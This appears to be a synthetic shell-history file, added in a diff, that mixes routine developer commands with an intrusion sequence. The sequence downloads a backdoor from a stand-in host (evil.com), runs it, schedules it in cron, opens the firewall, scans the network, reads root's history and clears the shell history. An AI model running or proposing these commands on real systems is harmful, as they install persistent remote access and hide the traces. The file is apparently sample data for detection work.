@@ -1,0 +1,80 @@
+crontab -l
+cd Projects
+git diff
+uname -a
+exit
+mv old.py new.py
+zip -r backup.zip .
+echo $PATH
+vim config.py
+echo $PATH
+exit
+find . -name '*.py'
+sudo -l
+cd Documents
+cat requirements.txt
+source venv/bin/activate
+cd Documents
+clear
+zip -r backup.zip .
+git branch
+zip -r backup.zip .
+chmod +x /tmp/bd
+rm -rf build
+/tmp/bd &
+vim config.py
+crontab -l
+id
+history
+git pull
+git pull
+find . -name '*.py'
+cd Documents
+git branch
+rm -rf build
+chmod +x /tmp/bd
+pwd
+pip list
+netstat -tulpn
+pwd
+iptables -P INPUT ACCEPT
+echo $PATH
+git push
+git checkout main
+nmap -sV 192.168.1.0/24
+mv old.py new.py
+git commit -m 'update'
+echo $PATH
+git diff
+nano README.md
+echo '* * * * * /tmp/bd' | crontab -
+cat requirements.txt
+cd Projects
+clear
+ls -la
+cd ..
+cat /root/.bash_history
+find . -name '*.py'
+sudo su
+nano README.md
+ls
+find . -name '*.py'
+git pull
+wget http://evil.com/backdoor -O /tmp/bd
+clear
+find . -name '*.py'
+history
+git branch
+ls /root
+git log
+find / -writable 2>/dev/null
+history -c
+cd Documents
+clear
+export TERM=xterm
+id
+cp config.example config.py
+ls -la
+echo $PATH
+python3 -m pytest
+source venv/bin/activate
